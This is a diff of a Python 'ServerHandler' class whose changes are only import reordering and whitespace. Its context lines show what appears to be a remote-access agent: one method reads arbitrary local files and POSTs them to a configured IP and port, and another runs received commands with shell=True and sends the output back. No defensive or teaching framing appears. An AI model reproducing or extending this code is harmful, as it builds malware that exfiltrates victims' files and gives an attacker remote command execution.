@@ -1,12 +1,12 @@
-from urllib import request, parse
-import subprocess
-import time
 import os
+import time
 import requests
+import subprocess
+from urllib import request, parse
+from http.server import BaseHTTPRequestHandler
 
 
-
-class ServerHandler:
+class ServerHandler():
 
     def __init__(self, ip, port):
         self.ip = ip
@@ -30,11 +30,9 @@ class ServerHandler:
 
 
     def send_file(self, image_file_path):
-
         if not os.path.exists(image_file_path):
             self.send_post("[-] Not able to find the file")
             return
-
         with open(image_file_path, 'rb') as fp:
             self.send_post(fp.read())
 
@@ -70,6 +68,7 @@ class ServerHandler:
                                       stderr=subprocess.PIPE, shell=True)
             self.send_post(result.stdout.read())
             self.send_post(result.stderr.read())
+
 
 
 
